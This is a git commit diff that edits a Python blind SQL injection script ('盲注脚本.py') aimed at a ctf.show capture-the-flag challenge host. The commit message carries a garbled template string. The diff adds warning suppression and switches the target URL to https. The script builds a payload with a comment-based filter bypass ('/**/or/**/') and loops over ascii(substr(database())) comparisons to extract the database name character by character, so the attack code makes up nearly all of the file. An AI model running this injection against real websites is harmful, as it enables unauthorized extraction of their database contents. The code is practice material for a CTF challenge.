b7b1895348ab8699abd692ebf210eb30fd18c8bb
whb54012 <1226844928@qq.com>
2026-07-21 11:17:39 +0000

    自动提交：更新 ${2026/7/21 19:17ilenPM17e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,7 +1,9 @@
 import requests
+import warnings
+warnings.filterwarnings("ignore")
 word=""
 num=0
-url = "http://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=/**/or/**/"
+url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=/**/or/**/"
 for num1 in range(1,8):
     for num2 in range (65,123):
         data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
